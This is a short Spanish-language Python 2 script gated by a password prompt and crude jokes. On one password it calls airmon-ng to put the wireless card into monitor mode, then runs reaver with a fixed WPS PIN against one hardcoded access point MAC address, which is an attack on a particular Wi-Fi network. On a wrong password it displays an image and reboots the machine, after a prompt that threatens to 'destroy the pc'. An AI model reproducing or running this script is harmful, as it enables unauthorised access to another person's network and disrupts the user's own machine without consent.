#!/usr/bin/env python
from Tkinter import *
import Image
import os
print ('si eres dabros o gibran deverias de saberlo:')

contra=raw_input("ingresa el passwords para continuar o destruir el pc: ")
if contra == "rostromaligno":
  print ('correcto toma para que deleites minetras auto hackeamos tu internet ')
  #foto=Image.open("utilerias_python/vienvenido.jpg")
  #foto.show()
  os.system('airmon-ng start wlan0')
  os.system("reaver -i mon0 -b 00:71:C2:49:BC:97 -p 91877444 -vv")
  os.system("echo 'listo llegale'")
  archivo=open("chica.txt")
  ver=archivo.read()
  print (ver)
  print ("Big Boss este es mi estilo")
elif contra == "sabrosura":
  print ('incorrecto pero casi toma una imagen sabrosa')
  foto=Image.open("utilerias_python/xxx.gif")
  foto.show()

else:
  print ("llegale a la verga ")
  foto=Image.open("utilerias_python/llegale.jpg")
  foto.show()
  raw_input('enter para salir por favor')
  os.system('reboot')
